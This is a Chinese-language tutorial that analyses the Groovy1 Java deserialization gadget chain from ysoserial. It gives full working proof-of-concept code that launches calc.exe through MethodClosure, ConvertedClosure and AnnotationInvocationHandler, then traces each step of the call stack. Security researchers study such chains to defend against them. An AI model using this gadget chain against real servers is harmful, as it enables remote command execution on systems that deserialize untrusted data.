```
package ysoserial.payloads;
import org.codehaus.groovy.runtime.ConvertedClosure;import org.codehaus.groovy.runtime.MethodClosure;import java.io.*;import java.lang.annotation.Retention;import java.lang.reflect.*;import java.util.Map;
public class M_Groovy1 {    public static void main(String[] args) throws Exception {        MethodClosure closure = new MethodClosure("calc.exe", "execute");        InvocationHandler convertedclosure = new ConvertedClosure(closure,"entrySet");        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},convertedclosure);//        proxymap.entrySet().iterator();
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);        //取消构造函数修饰符限制        ctor.setAccessible(true);        Object instance = ctor.newInstance(Retention.class,proxymap);        //payload序列化写入文件，模拟网络传输        FileOutputStream f = new FileOutputStream("payload.bin");        ObjectOutputStream fout = new ObjectOutputStream(f);        fout.writeObject(instance);
        //2.服务端读取文件，反序列化，模拟网络传输        FileInputStream fi = new FileInputStream("payload.bin");        ObjectInputStream fin = new ObjectInputStream(fi);        //服务端反序列化        fin.readObject();    }}
```

## 利用链分析  

首先还是看下调用栈，在`AnnotationInvocationHandle#readObject`方法中调用了`entrySet`方法，然后调用到了`ConversionHandler#invoke`，看到这里好像有一点熟悉的味道，和CC3比较像，不同的是CC3调用的是`AnnotationInvocationHandler#invoke`。

![](../Images/5db66c8dcb36d7a2982acffe5b5d72ea.png)

这里还是利用里动态代理的相关知识

如果`this.memberValues`是`map`的代理类，那么调用`entrySet`方法会调用到`invocationHandler`的`invoke`方法上

![](../Images/6e80e8b18f810c6387f65c6b545a0ae8.png)

通过调用栈可以看到调用了`ConversionHandler#invoke`，所以需要构造`map`的动态代理类是`ConversionHandler`类或者其子类。

`ConversionHandler#invoke`中会调用`invokeCustom`方法，传入的参数分别是动态代理对象、被代理方法也即是entrySet、entrySet方法的参数

![](../Images/fd376828b04585abf90ee5f8787d492c.png)

`invokeCustom`中会调用`this.getDelegate().call`方法

![](../Images/b8b120e9ffd6f792ade88913aebc4f05.png)

`this.getDelegate()`方法返回`delegate`属性，该属性是在构造方法中赋值的。

![](../Images/f949448a78770c69e9903e2e38b69da1.png)

然后调用到了`Closure#call`,所以`delegate`属性是一个`Closure`或者其子类的对象，此处是一个`MethodClosure`的对象。该方法中先通过`getMetaClass`方法得到一个`MetaClassImpl`的实例，然后调用该实例的`invokeMethd`方法，传入了当前对象的引用`this`。

![](../Images/76a5a860779ec101071d3c46a0b6f88d.png)

`invokeMethd`方法中要求object（也就是上个函数中传如的this引用）必须是`MethodCloSure`的实例，才可以

调用到`ownerMetaClass.invokeMethod`可以看到传入的参数`methodName`是`execute`、`owner`是`calc.exe`，

`ownerMetaClass`是通过`owner`的类型获取的另一个`MetaClassImpl`的实例

![](../Images/d476ed78e287b775b9fcf16d2f656b3b.png)

`methodName`参数是通过`mc.getMethod()`得到的method属性，owner参数是closure.getOwner()获取的，由于`MethodCloSure`继承自`closure`，这两个参数都是在`MethodCloSure`的构造方法中赋值。

![](../Images/7339572e630755112734f42439f8e701.png)

继续跟进`MetaClassImpl#invokeMethod`，先通过`methodName`参数获取了一个`Method`，可以看待此时`Method`是一个`dgm$748`的实例由于此时的参数`object`是`calc.exe`这个字符串，所以直接会调用`method.doMethodInvoke`方法。

![](../Images/aeff275ef15eceb59f775c5529702de8.png)

`dgm$748#doMethodInvoke`中会调用`processGrroyMethods.execute`方法，传入的第一个参数就是`calc.exe`

![](../Images/e43610ee9928fb75b066d796f88ce6f1.png)

`processGrroyMethods#execute`会调用`Runtime.getRuntime().exec()`执行命令`calc.exe`命令。

![](../Images/2329633e62b511801b6c2794ff23e0ad.png)

由以上分析可知，当构造好一个`MethodCloSure`的实例，当调用该实例的call方法时最终会调用对应的org.codehaus.groovy.runtime下的对应dgm类的`doMethodInvoke`方法，如下所示

![](../Images/32d72a43a8c6952674a35283fc85f48e.png)

![](../Images/deb030d92e38cfab7599ea4cb6fc2c3b.png)

## 总结

总体步骤，分为如下几步

*   构造好一个`MethodCloSure`实例，`owner`属性是`calc.exe`,`method`属性是`execute`
    
*   构造好一个`ConvertedClosure`实例，该类的`delegate`属性是第一步构造好的`MethodCloSure`实例，`method`属性是`entrySet`
    
*   将`ConvertedClosure`实例作为handler生成一个map的代理类
    
*   构造好`AnnotationInvocationHandler`实例，该类的`memberValue`属性是构造好的代理类
    

当`AnnotationInvocationHandler`反序列化时会调用`ConvertedClosure#invokeCustom`，`ConvertedClosure#invokeCustom`中会调用`MethodCloSure#call`导致执行了构造的恶意命令。
